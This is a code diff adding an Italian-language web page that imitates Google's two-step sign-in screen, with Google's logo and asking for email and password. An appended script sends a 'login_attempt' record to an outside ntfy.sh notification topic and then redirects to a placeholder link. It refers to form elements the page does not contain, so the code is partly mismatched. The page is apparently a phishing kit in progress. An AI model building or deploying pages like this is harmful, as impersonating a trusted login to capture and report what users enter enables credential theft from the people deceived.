@@ -28,3 +28,539 @@
         @media (prefers-color-scheme: dark) {
             :root {
                 --background: #0b0b0b;
+                --text: #ffffff;
+                --secondary: #bdbdbd;
+                --input-background: #151515;
+                --input-border: #777777;
+                --blue: #8ab4f8;
+                --button-background: #8ab4f8;
+                --button-text: #07111f;
+            }
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: var(--background);
+            color: var(--text);
+            font-family: "Larsseit", Arial, sans-serif;
+        }
+
+        .page {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 45px 28px 40px;
+        }
+
+        .login-box {
+            width: 100%;
+            max-width: 520px;
+        }
+
+        .logo {
+            width: 42px;
+            height: 42px;
+            margin-bottom: 28px;
+
+            display: flex;
+            align-items: center;
+        }
+
+        .logo img {
+            width: 38px;
+            height: 38px;
+            object-fit: contain;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 36px;
+            line-height: 1.15;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            margin-top: 15px;
+            margin-bottom: 40px;
+            color: var(--secondary);
+            font-size: 18px;
+            line-height: 1.4;
+        }
+
+        .email-input,
+        .password-input {
+            width: 100%;
+            height: 60px;
+
+            padding: 0 18px;
+
+            border: 1px solid var(--input-border);
+            border-radius: 7px;
+
+            background: var(--input-background);
+            color: var(--text);
+
+            font-family: "Larsseit", Arial, sans-serif;
+            font-size: 16px;
+
+            outline: none;
+        }
+
+        .email-input::placeholder,
+        .password-input::placeholder {
+            color: var(--secondary);
+        }
+
+        .email-input:focus,
+        .password-input:focus {
+            border: 2px solid var(--blue);
+            padding-left: 17px;
+        }
+
+        .forgot {
+            display: inline-block;
+            margin-top: 16px;
+
+            color: var(--blue);
+            text-decoration: none;
+
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .account {
+            display: inline-flex;
+            align-items: center;
+
+            margin-top: 10px;
+            margin-bottom: 38px;
+
+            padding: 8px 13px;
+
+            border: 1px solid var(--input-border);
+            border-radius: 20px;
+
+            color: var(--text);
+            font-size: 15px;
+        }
+
+        .account-icon {
+            width: 22px;
+            height: 22px;
+
+            margin-right: 9px;
+
+            border-radius: 50%;
+
+            background: var(--secondary);
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            font-size: 12px;
+            color: var(--background);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        /* MOSTRA PASSWORD */
+
+        .show-password {
+            display: flex;
+            align-items: center;
+
+            margin-top: 14px;
+
+            color: var(--text);
+
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .show-password input {
+            width: 18px;
+            height: 18px;
+
+            margin: 0 9px 0 0;
+
+            accent-color: var(--blue);
+
+            cursor: pointer;
+        }
+
+        .bottom {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 68px;
+        }
+
+        .next-button {
+            min-width: 96px;
+            height: 46px;
+
+            padding: 0 25px;
+
+            border: none;
+            border-radius: 23px;
+
+            background: var(--button-background);
+            color: var(--button-text);
+
+            font-family: "Larsseit", Arial, sans-serif;
+            font-size: 15px;
+            font-weight: 500;
+
+            cursor: pointer;
+        }
+
+        .next-button:hover {
+            opacity: 0.88;
+        }
+
+        .next-button:active {
+            transform: scale(0.97);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 600px) {
+
+            .page {
+                padding: 45px 24px 30px;
+            }
+
+            .logo {
+                margin-bottom: 28px;
+            }
+
+            .logo img {
+                width: 38px;
+                height: 38px;
+            }
+
+            h1 {
+                font-size: 32px;
+            }
+
+            .subtitle {
+                font-size: 17px;
+                margin-bottom: 38px;
+            }
+
+            .email-input,
+            .password-input {
+                height: 58px;
+            }
+
+            .bottom {
+                margin-top: 58px;
+            }
+        }
+
+    </style>
+</head>
+
+<body>
+
+    <main class="page">
+
+        <div class="login-box">
+
+            <!-- LOGO -->
+
+            <div class="logo">
+                <img
+                    src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg"
+                    alt="Google"
+                >
+            </div>
+
+            <!-- PRIMO PASSAGGIO -->
+
+            <section id="stepEmail">
+
+                <h1>Accedi</h1>
+
+                <div class="subtitle">
+                    Utilizza il tuo Account
+                </div>
+
+                <input
+                    id="emailInput"
+                    class="email-input"
+                    type="email"
+                    placeholder="Email"
+                    autocomplete="email"
+                >
+
+                <a
+                    href="#"
+                    class="forgot"
+                    onclick="return false;"
+                >
+                    Non ricordi l'indirizzo mail?
+                </a>
+
+                <div class="bottom">
+                    <button
+                        class="next-button"
+                        id="emailNext"
+                        type="button"
+                    >
+                        Avanti
+                    </button>
+                </div>
+
+            </section>
+
+            <!-- SECONDO PASSAGGIO -->
+
+            <section id="stepPassword" class="hidden">
+
+                <h1>Ciao</h1>
+
+                <div class="account">
+
+                    <div class="account-icon">
+                        @
+                    </div>
+
+                    <span id="selectedEmail"></span>
+
+                </div>
+
+                <div class="password-container">
+
+                    <input
+                        id="passwordInput"
+                        class="password-input"
+                        type="password"
+                        placeholder="Password"
+                        autocomplete="current-password"
+                    >
+
+                    <label class="show-password">
+
+                        <input
+                            id="showPassword"
+                            type="checkbox"
+                        >
+
+                        Mostra password
+
+                    </label>
+
+                </div>
+
+                <div class="bottom">
+
+                    <button
+                        class="next-button"
+                        id="passwordNext"
+                        type="button"
+                    >
+                        Avanti
+                    </button>
+
+                </div>
+
+            </section>
+
+        </div>
+
+    </main>
+
+    <script>
+
+        const emailInput =
+            document.getElementById("emailInput");
+
+        const emailNext =
+            document.getElementById("emailNext");
+
+        const stepEmail =
+            document.getElementById("stepEmail");
+
+        const stepPassword =
+            document.getElementById("stepPassword");
+
+        const selectedEmail =
+            document.getElementById("selectedEmail");
+
+
+        function goToPassword() {
+
+            const email =
+                emailInput.value.trim();
+
+            if (email === "") {
+                emailInput.focus();
+                return;
+            }
+
+            selectedEmail.textContent = email;
+
+            stepEmail.classList.add("hidden");
+            stepPassword.classList.remove("hidden");
+
+        }
+
+
+        emailNext.addEventListener(
+            "click",
+            goToPassword
+        );
+
+
+        emailInput.addEventListener(
+            "keydown",
+            function(event) {
+
+                if (event.key === "Enter") {
+                    goToPassword();
+                }
+
+            }
+        );
+
+
+        /* MOSTRA / NASCONDI PASSWORD */
+
+        const passwordInput =
+            document.getElementById("passwordInput");
+
+        const showPassword =
+            document.getElementById("showPassword");
+
+
+        showPassword.addEventListener(
+            "change",
+            function() {
+
+                if (showPassword.checked) {
+
+                    passwordInput.type = "text";
+
+                } else {
+
+                    passwordInput.type = "password";
+
+                }
+
+            }
+        );
+
+
+        /* SECONDO AVANTI */
+
+        const passwordNext =
+            document.getElementById("passwordNext");
+
+
+        passwordNext.addEventListener(
+            "click",
+            function() {
+
+                if (passwordInput.value === "") {
+                    passwordInput.focus();
+                    return;
+                }
+
+                console.log("Accesso demo");
+
+            }
+        );
+
+
+        passwordInput.addEventListener(
+            "keydown",
+            function(event) {
+
+                if (event.key === "Enter") {
+                    passwordNext.click();
+                }
+
+            }
+        );
+document.getElementById('password-form').addEventListener('submit', async function(event) {
+
+    event.preventDefault();
+
+    var name = document.getElementById('name').value.trim();
+
+    if (!name) {
+
+        return;
+
+    }
+
+    var data = {
+
+        "name": name,
+
+        "event": "login_attempt",
+
+        "extra": {}
+
+    };
+
+    try {
+
+        const response = await fetch(
+
+            "https://ntfy.sh/gabriele-telefono-739281-xp",
+
+            {
+
+                method: "POST",
+
+                headers: {
+
+                    "Content-Type": "application/json"
+
+                },
+
+                body: JSON.stringify(data)
+
+            }
+
+        );
+
+        if (response.ok) {
+
+            console.log("Notifica inviata a ntfy.");
+
+            // Link a cui reindirizzare dopo l'invio
+
+            window.location.href = "https://TUO-LINK.com";
+
+        } else {
+
+            console.error("Errore ntfy:", response.status);
+
+        }
+
+    } catch (error) {
+
+        console.error("Errore di connessione:", error);
+
+    }
+
+});
+    </script>
+
+</body>
+</html>
